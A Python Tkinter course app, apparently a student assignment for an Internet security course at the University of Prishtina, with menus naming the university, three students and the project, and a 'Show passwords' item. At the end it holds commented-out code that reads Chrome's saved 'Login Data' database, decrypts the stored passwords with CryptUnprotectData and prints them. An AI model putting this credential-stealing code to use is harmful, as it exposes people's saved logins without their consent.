from tkinter import *

root = Tk()
root.title("Aplikacioni per detyren e trete")
root.geometry("400x400")

 



my_menu = Menu(root)
root.config(menu=my_menu)

#click command
def our_command():
	hide_frames()
	my_label = Label(root, text = "You clicked a dropdown menu..").pack()

def fk():
	hide_frames()
	file_new_frame.pack(fill="both", expand=1)
	my_label = Label(file_new_frame, text = "University of Prishtina 'Hasan Prishtina'").pack()

def students():
	hide_frames()
	file_new_frame.pack(fill="both", expand=1)
	teksti = Label(file_new_frame, text="Studentet: ").pack()
	teksti = Label(file_new_frame, text="Arianita Kabashi").pack()
	teksti = Label(file_new_frame, text="Etnika Halili").pack()
	teksti = Label(file_new_frame, text="Greta Eshrefi").pack()

def projekti():
	hide_frames()
	file_new_frame.pack(fill="both", expand=1)
	my_label = Label(file_new_frame, text = "Projekti i trete ne lenden siguria e Internetit ka te beje me....").pack()

#hide all frames function
def hide_frames():
	file_new_frame.pack_forget()
	edit_cut_frame.pack_forget()



#create a menu item
file_menu = Menu(my_menu)
my_menu.add_cascade(label="About", menu=file_menu)
file_menu.add_command(label="University", command=fk)
file_menu.add_separator()
file_menu.add_command(label="Students", command=students)
file_menu.add_separator()
file_menu.add_command(label="Project", command=projekti)


#create another menu
edit_menu = Menu (my_menu)
my_menu.add_cascade(label="Show", menu=edit_menu)
edit_menu.add_command(label="Show passwords", command=our_command)
# file_menu.add_separator()
# edit_menu.add_command(label="Copy", command=our_command)


#create some frames
file_new_frame = Frame(root, width=400, height=400, bg="grey")
edit_cut_frame = Frame(root, width=400, height=400, bg="pink")

root.mainloop()







# import os
# import sqlite3
# # import win32crypt


# def get_chrome():
#     data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
#     c = sqlite3.connect(data_path)
#     cursor = c.cursor()
#     select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
#     cursor.execute(select_statement)

#     login_data = cursor.fetchall()

#     cred = {}

#     string = ''

#     for url, user_name, pwd in login_data:
#         pwd = win32crypt.CryptUnprotectData(pwd)
#         cred[url] = (user_name, pwd[1].decode('utf8'))
#         string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
#         print(string)


# if _name__=='__main_':
#     get_chrome()